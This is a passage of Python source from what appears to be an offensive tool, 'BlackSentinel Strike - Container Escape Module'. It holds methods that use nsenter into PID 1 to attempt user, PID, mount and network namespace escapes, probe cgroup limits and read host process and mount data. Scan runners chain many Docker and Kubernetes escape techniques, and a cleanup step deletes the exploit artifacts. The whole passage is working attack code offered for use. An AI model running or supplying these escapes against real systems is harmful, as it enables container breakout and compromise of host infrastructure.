                "cat /proc/1/setgroups 2>/dev/null || echo 'setgroups_not_readable'"
            )
            output_parts.append(f"[*] Setgroups: {setgroups}")

            output_parts.append("[*] Attempting user namespace escape...")
            ns_escape = self.run_command(
                "nsenter -t 1 -U -- sh -c 'echo user_ns_escape_success; id' 2>/dev/null || "
                "echo 'user_ns_escape_failed'",
                timeout=15
            )
            output_parts.append(f"[*] User namespace escape: {ns_escape}")

            output_parts.append("[*] Checking for uid 0 in namespace...")
            uid_check = self.run_command("id 2>/dev/null")
            output_parts.append(f"[*] Current ID: {uid_check}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def pid_namespace_escape(self) -> str:
        """Generic container escape via PID namespace escape."""
        technique = "PID Namespace Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking PID namespace...")
            pid_ns = self.run_command("readlink /proc/1/ns/pid 2>/dev/null")
            output_parts.append(f"[*] PID namespace: {pid_ns}")

            output_parts.append("[*] Counting visible processes...")
            visible_pids = self.run_command(
                "ls /proc/ | grep -E '^[0-9]+$' | wc -l"
            )
            output_parts.append(f"[*] Visible PIDs: {visible_pids}")

            output_parts.append("[*] Checking PID namespace level...")
            ns_level = self.run_command(
                "cat /proc/1/ns/pid 2>/dev/null"
            )
            output_parts.append(f"[*] PID namespace: {ns_level}")

            output_parts.append("[*] Attempting PID namespace escape...")
            pid_escape = self.run_command(
                "nsenter -t 1 -p -- sh -c 'echo pid_ns_escape_success; ps aux | head -5' 2>/dev/null || "
                "echo 'pid_ns_escape_failed'",
                timeout=15
            )
            output_parts.append(f"[*] PID namespace escape: {pid_escape}")

            output_parts.append("[*] Checking for host PID visibility...")
            host_pids = self.run_command(
                "ls /proc/ | grep -E '^[0-9]+$' | sort -n | tail -10"
            )
            output_parts.append(f"[*] Host PIDs visible:\n{host_pids}")

            output_parts.append("[*] Checking for init process access...")
            init_access = self.run_command(
                "cat /proc/1/status 2>/dev/null | head -20"
            )
            output_parts.append(f"[*] Init process status:\n{init_access}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def mount_namespace_escape(self) -> str:
        """Generic container escape via mount namespace escape."""
        technique = "Mount Namespace Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking mount namespace...")
            mount_ns = self.run_command("readlink /proc/1/ns/mnt 2>/dev/null")
            output_parts.append(f"[*] Mount namespace: {mount_ns}")

            output_parts.append("[*] Listing current mounts...")
            mounts = self.run_command("mount 2>/dev/null | head -30")
            output_parts.append(f"[*] Mounts:\n{mounts}")

            output_parts.append("[*] Checking mount propagation...")
            propagation = self.run_command(
                "cat /proc/1/mountinfo 2>/dev/null | grep -E 'shared|private|slave' | head -10"
            )
            output_parts.append(f"[*] Mount propagation:\n{propagation}")

            output_parts.append("[*] Attempting mount namespace escape...")
            mount_escape = self.run_command(
                "nsenter -t 1 -m -- sh -c 'echo mount_ns_escape_success; mount | head -10' 2>/dev/null || "
                "echo 'mount_ns_escape_failed'",
                timeout=15
            )
            output_parts.append(f"[*] Mount namespace escape: {mount_escape}")

            output_parts.append("[*] Checking for writable mount points...")
            writable_mounts = self.run_command(
                "cat /proc/1/mountinfo 2>/dev/null | grep 'rw,' | head -10"
            )
            output_parts.append(f"[*] Writable mounts:\n{writable_mounts}")

            output_parts.append("[*] Checking for tmpfs mounts...")
            tmpfs = self.run_command(
                "mount | grep tmpfs 2>/dev/null | head -10"
            )
            output_parts.append(f"[*] Tmpfs mounts:\n{tmpfs}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def network_namespace_escape(self) -> str:
        """Generic container escape via network namespace escape."""
        technique = "Network Namespace Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking network namespace...")
            net_ns = self.run_command("readlink /proc/1/ns/net 2>/dev/null")
            output_parts.append(f"[*] Network namespace: {net_ns}")

            output_parts.append("[*] Listing network interfaces...")
            interfaces = self.run_command(
                "ip link show 2>/dev/null || ifconfig 2>/dev/null | head -30"
            )
            output_parts.append(f"[*] Interfaces:\n{interfaces}")

            output_parts.append("[*] Checking network configuration...")
            net_config = self.run_command(
                "ip addr show 2>/dev/null | head -40"
            )
            output_parts.append(f"[*] Network config:\n{net_config}")

            output_parts.append("[*] Checking routing table...")
            routes = self.run_command(
                "ip route show 2>/dev/null || route -n 2>/dev/null | head -15"
            )
            output_parts.append(f"[*] Routes:\n{routes}")

            output_parts.append("[*] Checking for DNS resolution...")
            dns = self.run_command(
                "cat /etc/resolv.conf 2>/dev/null"
            )
            output_parts.append(f"[*] DNS config:\n{dns}")

            output_parts.append("[*] Checking for network namespace escape...")
            net_escape = self.run_command(
                "nsenter -t 1 -n -- ip addr show 2>/dev/null | head -20 || "
                "echo 'network_ns_escape_failed'",
                timeout=15
            )
            output_parts.append(f"[*] Network namespace escape:\n{net_escape}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def resource_limits_escape(self) -> str:
        """Generic container escape via resource limits bypass."""
        technique = "Resource Limits Escape"
        try:
            output_parts = []

            output_parts.append("[*] Checking resource limits...")
            ulimits = self.run_command("ulimit -a 2>/dev/null")
            output_parts.append(f"[*] Resource limits:\n{ulimits}")

            output_parts.append("[*] Checking cgroup resource limits...")
            cgroup_limits = self.run_command(
                "cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null || "
                "cat /sys/fs/cgroup/memory.max 2>/dev/null || "
                "echo 'cgroup_limits_not_found'"
            )
            output_parts.append(f"[*] Memory limit: {cgroup_limits}")

            output_parts.append("[*] Checking CPU limits...")
            cpu_limits = self.run_command(
                "cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 2>/dev/null || "
                "cat /sys/fs/cgroup/cpu.max 2>/dev/null || "
                "echo 'cpu_limits_not_found'"
            )
            output_parts.append(f"[*] CPU limit: {cpu_limits}")

            output_parts.append("[*] Checking PID limits...")
            pid_limits = self.run_command(
                "cat /sys/fs/cgroup/pids/pids.max 2>/dev/null || "
                "echo 'pid_limits_not_found'"
            )
            output_parts.append(f"[*] PID limit: {pid_limits}")

            output_parts.append("[*] Checking for fork bomb protection...")
            fork_test = self.run_command(
                "bash -c 'ulimit -u 2>/dev/null || echo ulimit_unlimited'"
            )
            output_parts.append(f"[*] Process limit: {fork_test}")

            output_parts.append("[*] Attempting resource limit bypass...")
            bypass = self.run_command(
                "cat /proc/self/cgroup 2>/dev/null | head -10"
            )
            output_parts.append(f"[*] Cgroup membership:\n{bypass}")

            output_parts.append("[*] Checking for cgroup escape...")
            cgroup_escape = self.run_command(
                "ls -la /sys/fs/cgroup/ 2>/dev/null | head -15"
            )
            output_parts.append(f"[*] Cgroup filesystem:\n{cgroup_escape}")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    # =========================================================================
    # UTILITY METHODS
    # =========================================================================

    def scan_all_docker_escape(self, target: str = "localhost") -> str:
        """Run all Docker escape techniques against target."""
        technique = "Docker Escape Scan"
        try:
            output_parts = []
            output_parts.append(f"[*] Target: {target}")
            output_parts.append("[*] Running comprehensive Docker escape scan...")

            self._get_container_info()

            docker_methods = [
                "docker_socket_mount_escape",
                "docker_privileged_escape",
                "docker_volume_escape",
                "docker_procfs_escape",
                "docker_sysfs_escape",
                "docker_cgroup_escape",
                "docker_nsenter_escape",
                "docker_capabilities_escape",
                "docker_dev_escape",
                "docker_mount_host_escape",
                "docker_runc_escape",
                "docker_containerd_escape",
                "docker_overlay_escape",
                "docker_pid_namespace_escape",
                "docker_env_escape",
            ]

            for method_name in docker_methods:
                output_parts.append(f"\n{'='*60}")
                output_parts.append(f"[*] Running {method_name}...")
                method = getattr(self, method_name)
                result = method()
                output_parts.append(result)

            output_parts.append(f"\n{'='*60}")
            output_parts.append(f"[*] Completed {len(docker_methods)} Docker escape techniques")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def scan_all_k8s_escape(self, target: str = "kubernetes.default.svc") -> str:
        """Run all Kubernetes escape techniques against target."""
        technique = "Kubernetes Escape Scan"
        try:
            output_parts = []
            output_parts.append(f"[*] Target: {target}")
            output_parts.append("[*] Running comprehensive Kubernetes escape scan...")

            self._get_container_info()

            k8s_methods = [
                "k8s_hostpath_escape",
                "k8s_privileged_escape",
                "k8s_hostpid_escape",
                "k8s_hostnetwork_escape",
                "k8s_hostipc_escape",
                "k8s_service_account_escape",
                "k8s_kubectl_exec_escape",
                "k8s_node_ssh_escape",
                "k8s_api_server_escape",
                "k8s_kubelet_escape",
                "k8s_containerd_socket_escape",
                "k8s_docker_socket_escape",
                "k8s_volume_escape",
                "k8s_init_container_escape",
                "k8s_security_context_escape",
            ]

            for method_name in k8s_methods:
                output_parts.append(f"\n{'='*60}")
                output_parts.append(f"[*] Running {method_name}...")
                method = getattr(self, method_name)
                result = method()
                output_parts.append(result)

            output_parts.append(f"\n{'='*60}")
            output_parts.append(f"[*] Completed {len(k8s_methods)} Kubernetes escape techniques")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def scan_all_container_breakout(self) -> str:
        """Run all container breakout techniques."""
        technique = "Container Breakout Scan"
        try:
            output_parts = []
            output_parts.append("[*] Running comprehensive container breakout scan...")

            self._get_container_info()

            breakout_methods = [
                "namespace_escape",
                "capabilities_escape",
                "seccomp_bypass",
                "apparmor_bypass",
                "selinux_bypass",
                "user_namespace_escape",
                "pid_namespace_escape",
                "mount_namespace_escape",
                "network_namespace_escape",
                "resource_limits_escape",
            ]

            for method_name in breakout_methods:
                output_parts.append(f"\n{'='*60}")
                output_parts.append(f"[*] Running {method_name}...")
                method = getattr(self, method_name)
                result = method()
                output_parts.append(result)

            output_parts.append(f"\n{'='*60}")
            output_parts.append(f"[*] Completed {len(breakout_methods)} container breakout techniques")

            self._log_result(technique, "\n".join(output_parts))
            return "\n".join(output_parts)
        except Exception as e:
            output = f"[!] Exception in {technique}: {str(e)}"
            self._log_result(technique, output, False)
            return output

    def get_results_summary(self) -> str:
        """Get summary of all executed techniques."""
        output_parts = []
        output_parts.append("=" * 60)
        output_parts.append("Container Escape Results Summary")
        output_parts.append("=" * 60)

        output_parts.append(f"\nTotal techniques executed: {len(self.techniques_executed)}")
        successful = sum(1 for r in self.results if r["success"])
        failed = len(self.results) - successful
        output_parts.append(f"Successful: {successful}")
        output_parts.append(f"Failed: {failed}")

        output_parts.append("\nTechniques executed:")
        for i, tech in enumerate(self.techniques_executed, 1):
            status = "[SUCCESS]" if any(
                r["technique"] == tech and r["success"]
                for r in self.results
            ) else "[FAILED]"
            output_parts.append(f"  {i}. {tech} {status}")

        output_parts.append("\n" + "=" * 60)
        return "\n".join(output_parts)

    def cleanup(self) -> None:
        """Clean up any artifacts created during escape attempts."""
        cleanup_cmds = [
            "rm -rf /tmp/cgrp 2>/dev/null",
            "rm -rf /tmp/host_root 2>/dev/null",
            "rm -rf /tmp/host_escape 2>/dev/null",
            "rm -rf /tmp/exploit 2>/dev/null",
            "rm -rf /tmp/escape_script.sh 2>/dev/null",
            "rm -rf /tmp/escape_output.txt 2>/dev/null",
            "docker rm -f blacksentinel_escape 2>/dev/null",
        ]
        for cmd in cleanup_cmds:
            self.run_command(cmd)
        self.results.clear()
        self.techniques_executed.clear()


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="BlackSentinel Strike - Container Escape Module"
    )
    parser.add_argument(
        "--target", "-t",
        default="localhost",
        help="Target host (default: localhost)"
    )
    parser.add_argument(
        "--scan", "-s",
        choices=["docker", "k8s", "breakout", "all"],
        default="all",
        help="Scan type (default: all)"
    )
    parser.add_argument(
        "--technique",
        help="Run specific technique by name"
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Enable verbose output"
    )
    parser.add_argument(
        "--cleanup", "-c",
        action="store_true",
        help="Clean up artifacts after scan"
    )
    parser.add_argument(
        "--output", "-o",
        help="Output file for results"
    )

    args = parser.parse_args()

    ce = ContainerEscape(verbose=args.verbose)

    if args.technique:
        method = getattr(ce, args.technique, None)
        if method:
            print(f"[*] Running {args.technique}...")
            print(method())
        else:
            print(f"[!] Unknown technique: {args.technique}")
            sys.exit(1)
    else:
        if args.scan in ["docker", "all"]:
            print("[*] Running Docker escape scan...")
            print(ce.scan_all_docker_escape(args.target))

        if args.scan in ["k8s", "all"]:
            print("[*] Running Kubernetes escape scan...")
            print(ce.scan_all_k8s_escape(args.target))

        if args.scan in ["breakout", "all"]:
            print("[*] Running container breakout scan...")
            print(ce.scan_all_container_breakout())

    print(ce.get_results_summary())

    if args.cleanup:
        print("[*] Cleaning up...")
        ce.cleanup()

    if args.output:
        with open(args.output, "w") as f:
            f.write(json.dumps(ce.results, indent=2))
        print(f"[*] Results saved to {args.output}")
